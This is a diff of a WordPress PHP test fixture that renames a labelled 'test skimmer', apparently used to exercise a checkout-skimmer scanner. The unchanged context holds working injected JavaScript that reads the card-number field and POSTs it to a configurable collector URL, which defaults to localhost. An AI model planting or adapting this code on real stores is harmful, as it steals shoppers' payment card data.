@@ -1,7 +1,7 @@
 <?php
 /**
  * ============================================================================
- *  PNAKOTIC TEST SKIMMER  --  OPT-IN, LOCAL TESTBED ONLY
+ *  MANDACARU TEST SKIMMER  --  OPT-IN, LOCAL TESTBED ONLY
  * ============================================================================
  *
  *  Adapted from woo-checkout-scanner/test-fixtures/test-skimmer.functions.php.
@@ -34,13 +34,13 @@ add_action( 'wp_footer', function () {
 		$exfil_url = getenv( 'MANDACARU_COLLECTOR_URL' ) ? getenv( 'MANDACARU_COLLECTOR_URL' ) : 'http://127.0.0.1:8199/collect';
 	}
 	?>
-	<script id="pnakotic-test-skimmer">
-	/* ==== PNAKOTIC TEST SKIMMER -- TESTBED ONLY ==== */
+	<script id="mandacaru-test-skimmer">
+	/* ==== MANDACARU TEST SKIMMER -- TESTBED ONLY ==== */
 	(function () {
 		var EXFIL = <?php echo wp_json_encode( $exfil_url ); ?>;
 		var CARD = 'input[autocomplete="cc-number"], input[name*="card" i][name*="number" i]';
 		var PLACE = '#place_order, .wc-block-components-checkout-place-order-button';
-		console.warn('[PNAKOTIC-TEST-SKIMMER] active; sends the card number field to ' + EXFIL);
+		console.warn('[MANDACARU-TEST-SKIMMER] active; sends the card number field to ' + EXFIL);
 
 		function cardValue() {
 			var el = document.querySelector(CARD);
@@ -49,7 +49,7 @@ add_action( 'wp_footer', function () {
 
 		function exfil(trigger) {
 			var value = cardValue();
-			var body = JSON.stringify({ trigger: trigger, card: value, note: 'PNAKOTIC-TEST-SKIMMER' });
+			var body = JSON.stringify({ trigger: trigger, card: value, note: 'MANDACARU-TEST-SKIMMER' });
 			try {
 				fetch(EXFIL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: body });
 			} catch (e) {}
@@ -68,7 +68,7 @@ add_action( 'wp_footer', function () {
 			if (t && t.closest && t.closest(PLACE)) { exfil('click'); }
 		}, true);
 	})();
-	/* ==== END PNAKOTIC TEST SKIMMER ==== */
+	/* ==== END MANDACARU TEST SKIMMER ==== */
 	</script>
 	<?php
 }, 100 );
